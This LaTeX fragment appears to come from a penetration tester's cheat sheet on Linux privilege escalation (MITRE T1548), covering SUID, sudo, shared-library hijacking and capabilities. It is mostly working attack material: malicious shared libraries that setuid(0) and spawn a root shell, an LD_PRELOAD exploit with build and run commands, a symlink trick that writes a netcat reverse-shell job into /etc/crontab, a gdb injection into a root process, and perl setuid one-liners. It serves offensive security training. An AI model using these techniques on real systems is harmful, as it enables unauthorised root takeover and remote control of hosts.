\section{Abuse Elevation Control Mechanism (T1548)}
\subsection{suid / sgid}

\subsubsection{Shell escape sequences}
search for suid / guid that can be used and confirm with
\href{https://gtfobins.github.io/}{GTFOBins}

\subsubsection{Shared Object Hijacking}

for a given binary \verb+bin+ check with \verb+ldd+ if it uses special library
and with \verb+readelf -d+ if a special runpath has been set.

If so check if the \verb+runpath+ is writable and copy the \verb+libc.so+ in
the \verb+runpath+ renaming it as the custom library.

confirm with \verb+ldd+ that everything is ok before runing the binary that
should crash providing the name of a function \verb+fun+ that is missing.

then compile the following code as a shared library and put it in the
\verb+runpath+ instead of the special librabry.
\begin{verbatim}
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
\end{verbatim}


\subsection{sudo}

\subsubsection{Shell escape sequences}
\verb+sudo -l+ search for authorized binary in \href{https://gtfobins.github.io/}{GTFOBins}

\subsubsection{Insecure env}

\begin{verbatim}
(root) SETENV: NOPASSWD: XX
\end{verbatim}

\verb+SETENV+ allow to disable the \verb+env_reset+ flag with \verb+sudo -E+

if \verb+secure_path+ is set it is possible to bypass it with:
\begin{verbatim}
sudo -E "PATH=/tmp:$PATH" XX
\end{verbatim}



\subsubsection{Shared library highjacking}
There are multiple methods for specifying the location of dynamic libraries, so
the system will know where to look for them on program execution. This includes
the \verb+-rpath+ or \verb+-rpath-link+ flags when compiling a program, using
the environmental variables \verb+LD_RUN_PATH+ or \verb+LD_LIBRARY_PATH+,
placing libraries in the \verb+/lib+ or \verb+/usr/lib+ default directories, or
specifying another directory containing the libraries within the
\verb+/etc/ld.so.conf+ configuration file.

Additionally, the
\href{https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html}{LD\_PRELOAD}
environment variable can load a library
before executing a binary. The functions from this library are given preference
over the default ones. The shared objects required by a binary can be viewed
using the \verb+ldd+ utility.

if \verb+sudo -l+ return the \verb-env_keep+=LD_PRELOAD-

then compiling the following code as a shared library
\begin{verbatim}
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
\end{verbatim}

\begin{verbatim}
gcc -fPIC -shared -o root.so root.c -nostartfiles
\end{verbatim}

then launch the binary with:
\begin{verbatim}
sudo LD_PRELOAD=/tmp/root.so COMMAND
\end{verbatim}

\subsubsection{Indirect write permission}

let consider it a script that can be called with sudo:
\begin{verbatim}
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
   /bin/cat log/photobomb.log > log/photobomb.log.old
   /usr/bin/truncate -s0 log/photobomb.log
fi
\end{verbatim}

as no controled is performed on \verb+log/photobomb.log.old+ to which we have
full access then:
\begin{verbatim}
rm ~/photobomb/log/photobomb.log.bak;ln -s /etc/crontab ~/photobomb/log/photobomb.log.bak
cp /etc/crontab ~/photobomb/log/photobomb.log
echo "***** root nc IP PORT -e /bin/sh" >> ~/photobomb/log/photobomb.log
sudo /opt/cleanup.sh
\end{verbatim}



\subsection{Capabilities}
Linux capabilities provide a subset of the available root privileges to a
process. This effectively breaks up root privileges into smaller and
distinctive units. Each of these units can then be independently be granted to
processes. This way the full set of privileges is reduced and decreasing the
risks of exploitation.

\subsubsection{ptrace / gdb / python}
\begin{verbatim}
developer@faculty:/tmp$ ps -aux | grep root | grep python
root         732  0.0  0.9  26896 18120 ?        Ss   Aug13   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
developer@faculty:/tmp$ gdb -p 732
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
...
0x00007f7238649967 in __GI___poll (fds=0x1a01a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29
29      ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
(gdb) call (void)system("chmod u+s /bin/bash")
[Detaching after vfork from child process 36079]
(gdb) quit
A debugging session is active.

        Inferior 1 [process 732] will be detached.

Quit anyway? (y or n) y
Detaching from program: /usr/bin/python3.8, process 732
[Inferior 1 (process 732) detached]
developer@faculty:/tmp$ /bin/bash -p
bash-5.0# whoami
root
\end{verbatim}

\subsubsection{cap\_setuid+ep}

if set on a compiler or an interpreter (such as \verb+perl+) in fact to
something that can perform a call to \verb+setuid+ boom

{\bf example with perl}:
\begin{verbatim}
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
system("/usr/bin/bash");
\end{verbatim}

or \verb+./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'+
